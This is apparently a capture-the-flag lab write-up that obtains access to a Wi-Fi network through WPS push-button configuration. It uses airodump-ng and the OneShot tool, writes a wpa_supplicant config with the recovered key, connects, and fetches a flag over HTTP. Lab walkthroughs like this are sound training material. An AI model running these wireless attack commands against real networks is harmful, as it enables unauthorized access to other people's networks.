# [Push Button Configuration](Push%20Button%20Configuration.md)
### Connect to the Wi-Fi network using the PBC method as outlined in the section. Once connected, submit the flag value present at http://192.168.1.1/

```sh
airodump-ng --wps -c 1 wlan0mon
```

![](Screenshot%202026-09-21%20at%2010.36.47.png)

```sh
python3 /opt/OneShot/oneshot.py -i wlan0mon --pbc
```

![](Screenshot%202026-09-21%20at%2010.39.30.png)

Switch from monitor mode to managed mode

```sh
airmon-ng stop wlan0mon
```

Create config file contain SSID và PSK

```txt
network={
    ssid="HackTheWireless"
    psk="42b5215eb129abec043d7f32596f4f90"
}
```

Connect to wpa_supplicant

```sh
wpa_supplicant -B -i wlan0mon -c /tmp/wifi.conf
```

![](Screenshot%202026-09-21%20at%2010.46.06.png)

Request IP from DHCP

```sh
dhclient wlan0
```

Obtain flag

```sh
wget http://192.168.1.1/
```

![](Screenshot%202026-09-21%20at%2010.45.46.png)